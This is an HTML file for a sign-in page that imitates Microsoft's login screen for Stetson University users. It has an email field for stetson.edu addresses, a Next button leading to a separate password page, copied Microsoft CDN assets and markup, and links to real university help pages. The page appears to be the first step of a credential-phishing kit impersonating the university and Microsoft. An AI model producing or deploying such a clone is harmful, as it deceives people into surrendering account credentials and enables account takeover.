<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width">
        <title>Sign In</title>
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
        <link rel="stylesheet" type="text/css" href="styling.css">
    </head>
    
   

    <body>
        <div class="container">
            <header id="header-img">
                
            </header>
            <section>
                <div style="text-align: left">
                    <img src="images/bannerlogo">
                </div>
                
                <h1>Sign in</h1>
                <!-- <p>Use your Microsoft account. <br> <a href="#">What's this?</a></p> -->

                <div id="form-input" style ="text-align: left;">
                    <input id="email" type="email" placeholder="user@stetson.edu OR user@law.stetson.edu" required>
                </div>
                <!-- <div id="form-input">
                    <input id="password" type="password" placeholder="Password" required>
                </div> -->

                <p style = "font-size: 13px;"><a href="#">Can't access you account?</a></p>
                <div id="form-submit">
                    
                    <button type="submit" onClick="window.location.href='password.html#';">Next</button>
                    <!-- <button type="submit" style = "background-color: gainsboro; color: black">Back</button> -->
                </div>
                
                
            </section>
            <!--
                <div class="section2">
                    <section>
                        <p>Test123</p>
                    </section>
                </div>
            -->
            <div class="section2">
                <p style = "font-size: 12px;"><a href="https://myapps.stetson.edu/pwdwizard/">Login Assistance</a> | <a href="https://www.stetson.edu/administration/information-technology/contact.php">Support Desk</a></p>
            </div>
            <div class="table" role="button" tabindex="0" data-bind="
            css: { 'list-item': svr.fSupportWindowsStyles },
            pressEnter: $page.otherSigninOptionsButton_onClick,
            click: $page.otherSigninOptionsButton_onClick,
            ariaLabel: $data.text" aria-label="Sign-in options">
            <div class="table-row">
                <div class="table-cell tile-img medium">
                    <img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
                </div>
                <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                    <div data-bind="
                        text: $data.text,
                        attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                </div>
            </div>
        </div>
           <!-- <footer>
                <p><a href="#">Terms of Use</a><a href="#">Privacy & Cookies</a></p>
                <div id="footer-img">
                    <img src="images/Microsoft_Logotype_Gray.svg">
                </div>
            </footer>
            -->
        </div>
    
    </body>
</html>
